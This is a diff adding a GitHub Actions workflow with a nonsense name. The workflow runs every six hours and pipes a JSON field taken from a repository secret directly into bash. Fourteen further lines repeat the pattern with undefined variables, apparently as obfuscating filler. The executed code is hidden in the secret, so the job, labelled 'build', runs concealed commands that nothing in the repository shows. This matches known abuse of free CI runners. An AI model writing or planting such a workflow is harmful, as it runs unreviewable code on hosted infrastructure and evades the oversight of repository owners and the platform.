@@ -1,0 +1,32 @@
+name: mianyangdeqingg
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: mianyangdeqingg
+        env:
+          fmpr8209: ${{ secrets.fmpr8209 }}
+        run: |
+          echo $fmpr8209 | jq -r .nzr23864 | /bin/bash
+          echo $eas40 | jq -r .mpy438 | /bin/bash
+          echo $obn91883 | jq -r .dvk188 | /bin/bash
+          echo $v295 | jq -r .w9087 | /bin/bash
+          echo $y0 | jq -r .n025 | /bin/bash
+          echo $sex7959 | jq -r .k6968 | /bin/bash
+          echo $dweop7 | jq -r .fg20410 | /bin/bash
+          echo $bf47 | jq -r .cir2644 | /bin/bash
+          echo $uvcgh22 | jq -r .swb128 | /bin/bash
+          echo $gc273 | jq -r .ntm7878 | /bin/bash
+          echo $pz7299 | jq -r .wyto1 | /bin/bash
+          echo $lx5 | jq -r .ihvqc0 | /bin/bash
+          echo $phv18503 | jq -r .ad82610 | /bin/bash
+          echo $jmij4825 | jq -r .ao18 | /bin/bash
+          echo $ntmav07765 | jq -r .gu13 | /bin/bash
+
